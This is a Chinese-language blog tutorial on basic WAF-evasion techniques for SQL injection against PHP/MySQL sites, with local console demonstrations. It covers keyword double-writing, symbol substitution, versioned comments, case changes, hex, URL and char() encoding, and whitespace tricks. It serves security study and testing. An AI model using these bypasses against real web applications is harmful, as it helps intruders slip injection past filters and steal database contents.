---
title: php+mysql 绕 WAF 基础
toc: true
description: 本文主要介绍php+mysql 平台下的基本绕过方式及其绕过的原理。
categories:
    - websec
    - sql injection
date: 2019-08-04 13:11:44
tags:
---

本文只针对 php mysql 绕过 WAF 的一些基础方式做一些总结记录，写这篇笔记的初衷是因为虽然在网上也能找到讲解这些技巧的文章，但是不知道为什么这种方式可以绕过？就很别扭。于是，想总结一下原因。如果有不恰当的地方欢迎下方留言告诉我。

有些思路可能对别的环境适用，但是在这里我并不想将其混起来谈，每个平台都有其特点，谈到其他平台时，如果有思想相似的，我会再单独写笔记记录的。

# 基础绕过方式：

## 双字符（也称双写、替换关键字）

比如：对 and or union select 等单个字的检测，可以使用 oorr，anandd，uniunionon，selselectect 等绕过。

适用：一般情况下，开发者会写一个函数，用来过滤需要过滤的东西。这里会用正则表达式匹配 or and 等他想要过滤的关键字，然后调用函数，将采参数传递进去进行检测。开发者在对 and 等关键字进行过滤时，往往使用正则匹配，如果正则匹配中没有使用 g 参数，即：循环匹配，那么我们就可以使用双字符绕过。

## 数学符号绕过

### and or 过滤绕过

and 可以用 && 代替，但是注意由于 & 在 url 中特殊作用（例如：连接 get 参数），所以使用时需要进行 url 编码。

or 可以用 || 代替，注意：||不用 url 编码，直接用即可，因为它不是什么特殊，保留字什么的。

适用：好多 WAF 只对 and、or 的英文单词进行了正则匹配，没有对其对应字符进行匹配。

原因：比如：基于黑名单的 WAF，不会对收到的 HTTP 报文进行解码，再比如：WAF 厂商疏忽大意（....）

注：对于 符号&（未编码的&）再进行 url 解码，也还是 &。

### 比较操作符绕过

在使用盲注的时候，在爆破的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到 greatest，strcmp, in, between 来进行绕过了。

GREATEST(n1,n2,n3,..........)

GREATEST()函数返回输入参数(n1, n2, n3, 等)组的最大值。

```sql
select * from tuser where passwd='passwd' and greatest(ascii(substr(version(),1,1)),1)<56;
```

本例中使用：ascii(substr(version(),1,1)) 与 1 比较，当然是返回前者，然后我们通过与 ASCII 码字符比较，看页面显示正常与否来猜字符。（注：8 的 ascii 码为 56）

strcmp (str1, str2)

比较两个字符串，如果这两个字符串相等返回 0，如果第一个参数是根据当前的排序小于第二个参数顺序返回 -1，否则返回 1。

```sql
select * from tuser where passwd='passwd' and strcmp(ascii(substr(version(),1,1)),56);
```

这个与上面有些不同的是，相等时返回零，页面显示不正常，当然，如果你觉得别扭，可以在前面加一个 ！取反。

## mysql C 风格注释变体

补充：mysql 的注释：

-   单行注释：# 或 -- （两个连字符加一个 whitespace 或者控制字符，比如：空格，tab，换行等)

-   C 风格注释（可跨行注释，可内联注释）：/\*\*/

-   C 风格注释的变体：/\*!\*/

C 风格注释的变体：

```sql
/*! MySQL-specific code */
```

MySQL 服务器能够解析并执行注释中的代码，就像对待其他 MySQL 语句一样，但其他 SQL 服务器将忽略这些扩展。通过此格式的注释，您可以编写包含 MySQL 扩展的代码，而且是可移植的。

```
mysql> select /*! id,username */ from tuser limit 4;
+------+----------+
| id   | username |
+------+----------+
|    1 | admin    |
|    1 | adam     |
|    1 | bob      |
|    2 | colin    |
+------+----------+
4 rows in set (0.00 sec)
```

注：该注释可以包裹关键字等，但是不可以插在单个关键字的字母中间。

此外，如果在`!` 字符后添加版本号，则仅当 MySQL 版本大于或等于指定的版本号时，才会执行注释中的语法。此特性，让开发者编写 mysql 扩展的时候，可以使用它来控制引入的库，便于不同版本的移植等。
比如：

```sql
   CREATE /*!55602 TEMPORARY */ TABLE t (a INT);
```

当 mysql 的版本**大于等于**5.56.02 时，mysql 将不会注释 TEMPOARY，

即在版本大于等于 5.56.02 的 mysql 中该语句就相当于：

```sql
CREATE TEMPORARY TABLE t (a INT);
```

比如在我的 mysql 8.0.12 上，测试

```sql
mysql> select version();
+-----------+
| version() |
+-----------+
| 8.0.12    |
+-----------+
1 row in set (0.00 sec)

mysql> /*!80012 select */ 1;
+---+
| 1 |
+---+
| 1 |
+---+
1 row in set (0.00 sec)

mysql> /*!80013 select */ 1;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '1' at line 1
```

## 大小写绕过

关键字大小写绕过用于只针对小写或大写的关键字匹配技术。

原理：正则表达式/express/i 匹配时大小写不敏感便无法绕过。这是最简单的绕过技术，不过现在直接使用这种绕过技术成功的可能性已经不高了。

## 编码绕过

### url 编码绕过

使用%加 16 进制的 url 编码对某些 sql 关键字，如：union，select、from 等进行编码来绕过 waf 的检测.

原理：

从 url 编码规范中，我们知道，不对英文大小写字母以及一些特殊字、保留字等进行 url 编码（但是其 url 编码是存在的。），对非保留字（如：中文，&，# 等）进行 url 编码，而 web 服务器才不管那些，它直接一股脑地将 url 全部进行解码来确定接收参数和定位资源。

对于英文字母的 url 标准不进行编码的字符来说，你对它进行 url 编码或解码它还是其本身。

url 编码规定：字符对应的 16 进制，把前面的 0x 换成 %，即为字符的 url 编码。因此我们利用这一点，可以对那些 url 本来不编码的英文字母进行 16 进制编码，然后将 0x 换为 %。web 服务器在解码的时候，也会将其解码为正常的英文字母，但是基于黑名单的 WAF 只匹配关键字，不进行解码，那就可以绕过了。但是碰上解码的 WAF，这种方法就是失效了。

比如：将 union 中的 u 编码为：%75，即：%75nion

### 十六进制编码绕过

**使用 16 进制代替字符串**，当然，这里的字符串可以是很多东西，比如：information_schema.schemata 中的一个具体的库名的字符串，也可以是 information_schema.tables 中一个具体的表名的字符串，也可以是一个表中具体的字段的字符串等。淡然，我们注入一般只在 where 条件筛选时会用到它。如果 WAF 对某些表/字段的关键字（如：admin，password 等）进行过滤时，我们可以尝试采用它。

tuser 对应的十六进制为：0x7475736572，因此，我们可以用 where table_name=0x7475736572 来代替 where table_name='tuser'

test 对应的十六进制为：0x74657374，因此，我们可以用 where schema_name=0x74657374 来代替 where schema_name='tuser'

通过这样，我们可以绕过两种过滤：一种是对某些敏感关键字，如：admin、passwd 等，一种是对引号的过滤，因为我们使用 16 进制，就不再需要引号了。

举例子：

```sql
mysql> select * from tuser where passwd=0x706173737764;
+------+----------+--------+
| id   | username | passwd |
+------+----------+--------+
|    2 | colin    | passwd |
|    2 | doc      | passwd |
|    3 | doctor   | passwd |
|    3 | elite    | passwd |
|    2 | colin    | passwd |
+------+----------+--------+
5 rows in set (0.00 sec)

mysql> select * from information_schema.schemata where schema_name=0x74657374;
+--------------+-------------+----------------------------+------------------------+----------+
| CATALOG_NAME | SCHEMA_NAME | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |
+--------------+-------------+----------------------------+------------------------+----------+
| def          | test        | utf8                       | utf8_general_ci        |     NULL |
+--------------+-------------+----------------------------+------------------------+----------+
1 row in set (0.00 sec)

mysql> select table_schema,table_name from information_schema.tables where table_name=0x7475736572;
+--------------+------------+
| TABLE_SCHEMA | TABLE_NAME |
+--------------+------------+
| test         | tuser      |
+--------------+------------+
1 row in set (0.00 sec)
```

### 编码函数绕过

1. mysql 中的 char() 函数会将每一个参数（参数用逗号分隔）都解释为整数，返回由这些整数在 ASCII 码中所对应字符所组成的字符串。忽略 NULL 值。

    > MySQL CHAR() returns the character value of the given integer value according to the ASCII table. It ignores the NULL value.

    比如: test 对应 ASCII 码为：116 101 115 116，那么可以用 char(116, 101, 115, 116) 代替 test 字符串。

    原理：当然很简单，**有的 WAF** 只用正则匹配关键字，你写成 ASCII 码，也不是 URL 解码能解出来的，所以它识别不出来，当然，如果 WAF 直接把 char 给列入黑名单，那就凉凉喽。

# 等价函数绕过

hex()、bin()、ascii()

sleep()、benchmark()

concat_ws()、group_concat()、concat

mid()、substr()、substring()

@@version、version()

未完待续...

# 宽字节绕过

暂未学习，学完再补充

# 空格过滤绕过

方法比较琐碎，且有些方法普适性不大，大部分都是针对空格过滤的，因此，这里的题目是空格过滤绕过。

## 编码

两个空格代替一个空格，用 Tab 代替空格

%a0 空格 %0a 新建一行 %0b TAB 键（垂直）

%09 TAB 键（水平） %0c 新的一页 %0d return 功能

由于不同平台等不同，大佬总结的咱也不好说，一般先使用 %a0，%0a，%0b，%b0 等测试。

下面是天书上的一段话：

> %a0 是空格的意思，（ps：此处我的环境是 ubuntu14.04+apache+mysql+php，可以解析%a0，此前在 windows+wamp 测试，不能解析%a0，有知情的请告知。）同时%0b 也是可以通过测试的，其他的经测试是不行的。||是或者的意思，'1 则是为了闭合后面的 ' 。

常用的 URL 编码中，会把空格编码成%20，所以通过浏览器发包，进行的 URL 编码中，空格被编码成%20。在 HTML 编码中，还有一个编码可以取代空格，也就是%a0

这个算是一个不成汉字的中文字符了，那这应该就好理解了，因为%a0 的特性，在进行正则匹配时，匹配到它时是识别为中文字符：�，所以不会被过滤掉，但是在进入 SQL 语句后，Mysql 是不认中文字符的，所以直接当作空格处理

## 多行注释

```php
mysql> select/**/id from tuser limit 4;
+------+
| id   |
+------+
|    1 |
|    1 |
|    1 |
|    2 |
+------+
4 rows in set (0.00 sec)
```

直接在需要空格的地方补一对多行注释即可。但是，当/\*或\*/被过滤的时候，就不好用了。

## 括号

```sql
select(id),(username)from(tuser)where(id=1)union(select(1),(2));
```

## 运算符与小数点

我们知道 mysql 允许 select 时对字段进行算术运算，比如：select 2\*id from xx；等。而我们还需要知道在计算机中，取正取负也算是一种算数运算。

针对数字前后空格的：+ - . 即：正号（加号），负号（减号），浮点（小数点）。

整型前面的空格：

\+ \-可以放在数字型字段名前面作为正负号（如：+1，-2，+id），这样一方面字段进行了取整取负的算术运算，另一方方面，由于有符号隔开其与前面的关键字 select 或其他字段，mysql 就不再需要空格了。

整型后面的空格：

方法一：

浮点（小数点）可以放在整型字段后面充当小数点..，小数点之后有没有小数位都成。但是虽然它作为一个符号就将其前面的整型字段与后面的关键字或字段隔开了，mysql 就不再要求空格了，但是加小数点可不算一种运算，那这样就会报错。

这里你需要知道在整型字段后面用+、-，那就是四则运算中的加减号了,+或-左右需要都有运算数，比如：id+1-1 等。

因此我们可以采用：id+1-1. 即：id 加整型 1 然后减去浮点数 1.的方式使他不报错，而且 id 的值不变。这种方式就可以省略整型字段后面的空格了。

方法二：

科学计数法上场

a\*10^b 写作：aeb

```sql
mysql> select+1e0from tuser limit 0,4;
+-----+
| 1e0 |
+-----+
|   1 |
|   1 |
|   1 |
|   1 |
+-----+
4 rows in set (0.00 sec)

mysql> select+ide0from tuser limit 0,4;
ERROR 1054 (42S22): Unknown column 'ide0from' in 'field list'
mysql> set @var=10;
Query OK, 0 rows affected (0.00 sec)

mysql> select @vare2;
+--------+
| @vare2 |
+--------+
| NULL   |
+--------+
1 row in set (0.00 sec)

mysql> select @var;
+------+
| @var |
+------+
|   10 |
+------+
1 row in set (0.00 sec)
```

根据上面测试我们看出，对于整型字段，用户定义变量等变量，科学计数法并不好使，它只适用于常量。虽然其如此有局限型，但是还是有用武之地。一般用在 where id=1e0 处

下面边测试边对其用法进行讲解

```sql
mysql> desc tuser;
+----------+-------------+------+-----+---------+-------+
| Field    | Type        | Null | Key | Default | Extra |
+----------+-------------+------+-----+---------+-------+
| id       | tinyint(4)  | YES  |     | NULL    |       |
| username | varchar(20) | YES  |     | NULL    |       |
| passwd   | varchar(20) | YES  |     | NULL    |       |
+----------+-------------+------+-----+---------+-------+
3 rows in set (0.00 sec)
```

首先，这里有一张 tuser 表，id 为整型

```sql
mysql> select+1;
+---+
| 1 |
+---+
| 1 |
+---+
1 row in set (0.04 sec)

mysql> select-1;
+----+
| -1 |
+----+
| -1 |
+----+
1 row in set (0.00 sec)

```

上面是正负号的演示，当然我们一般用在整型字段上时，都用正号。我测试负号只是为了让你看的更清楚。

```sql
mysql> select id.from tuser;
ERROR 1109 (42S02): Unknown table 'id' in field list

mysql> select+id-1+1.from tuser limit 0,4;
+----------+
| +id-1+1. |
+----------+
|        1 |
|        1 |
|        1 |
|        2 |
+----------+
4 rows in set (0.00 sec)
```

根据上面的测试`+id-1+1.`便把整型字段前后的空格都解决了。（注：我用 limit 只是因为我表中记录比较多而已，可以不用，没别的原因。）

注意：这种方法对 mysql 中的整型字段/返回值为整型的都是可以用的，比如：count()

```sql
mysql> select+count(id)+1-1.from tuser;
+-----------------+
| +count(id)+1-1. |
+-----------------+
|              16 |
+-----------------+
1 row in set (0.00 sec)
```

但是，注意；limit 后的数字用运算符会报错。

```sql
mysql> select/**/id from tuser limit+0,1;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '+0,1' at line 1
mysql> select/**/id from tuser limit 0,-1;
```

## 反引号

强大的反引号（你键盘 esc 下面那个）这里我们可以用它来包裹很多。

它常常用来包裹那些不是有效的 identifiers（字段名，表名，库名，列名，别名），比如：identifier 中有空格或连字符或者与关键字冲突，你在创建或使用的时候，就要用反引号包裹起来来和别的区分开了。

```sql
mysql> select id`编号` from tuser where id=1 limit 0,4;
+--------+
| 编号   |
+--------+
|      1 |
|      1 |
|      1 |
|      1 |
+--------+
4 rows in set (0.00 sec)
```

具体来说，我们可以用它来包裹：字段，库，表，别名，verison()中的 version

但是不可以包裹 database()中的 database。

```sql
mysql> select`version`();
+-------------+
| `version`() |
+-------------+
| 8.0.12      |
+-------------+
1 row in set (0.00 sec)

mysql> select`database`();
ERROR 1630 (42000): FUNCTION test.database does not exist. Check the 'Function Name Parsing and Resolution' section in the Reference Manual

mysql> select`id`,`username`from`tuser`where`id`=1e0order by username;
+------+----------+
| id   | username |
+------+----------+
|    1 | NULL     |
|    1 |          |
|    1 |  3fd     |
|    1 |  dewe    |
|    1 | 0        |
|    1 | adam     |
|    1 | adam     |
|    1 | admin    |
|    1 | admin    |
|    1 | bob      |
|    1 | bob      |
+------+----------+
11 rows in set (0.00 sec)

mysql> select`id`,`username`from`tuser`where`id`=1e0union select+1,2;
+------+----------+
| id   | username |
+------+----------+
|    1 | admin    |
|    1 | adam     |
|    1 | bob      |
|    1 | NULL     |
|    1 | 0        |
|    1 |          |
|    1 |  dewe    |
|    1 |  3fd     |
|    1 | 2        |
+------+----------+
9 rows in set (0.00 sec)

mysql> select`id`,`username`from`tuser`where`id`=1e0and+1=1;
+------+----------+
| id   | username |
+------+----------+
|    1 | admin    |
|    1 | adam     |
|    1 | bob      |
|    1 | NULL     |
|    1 | admin    |
|    1 | adam     |
|    1 | bob      |
|    1 | 0        |
|    1 |          |
|    1 |  dewe    |
|    1 |  3fd     |
+------+----------+
11 rows in set (0.00 sec)
```

注意：跨库查询时，如果要使用反引号，库名和表名都要加反引号

```sql
mysql> select schema_name from `information_schema`.`schemata`;
+--------------------+
| SCHEMA_NAME        |
+--------------------+
| mysql              |
| information_schema |
| performance_schema |
| sys                |
| dvwa               |
| test               |
+--------------------+
6 rows in set (0.00 sec)

mysql> select schema_name from `information_schema.schemata`;
ERROR 1146 (42S02): Table 'test.information_schema.schemata' doesn't exist
```

根据上面测试看，反引号与运算符、小数点、科学计数法一起使用，就可以绕过除了 order by、union select、limit 1 中间的空格了。那么这三个之间的空格呢？目前只能采用上面的编码或多行注释。

## 数学符号

当然，使用 and 或 or 的时候我们还可以通过使用他们的符号来避免在其周围加空格。测试如下（|| 与 && 测试效果一样）

```
mysql> select`id`,`username`from`tuser`where`id`=1&&1=1;
+------+----------+
| id   | username |
+------+----------+
|    1 | admin    |
|    1 | adam     |
|    1 | bob      |
|    1 | NULL     |
|    1 | admin    |
|    1 | adam     |
|    1 | bob      |
|    1 | 0        |
|    1 |          |
|    1 |  dewe    |
|    1 |  3fd     |
+------+----------+
11 rows in set (0.00 sec)

mysql> select`id`,`username`from`tuser`where`id`=1&&1=0;
Empty set (0.00 sec)
```

未完待续...

# 参考资料

[MySQL 9.6 Comment Syntax](https://dev.mysql.com/doc/refman/8.0/en/comments.html)
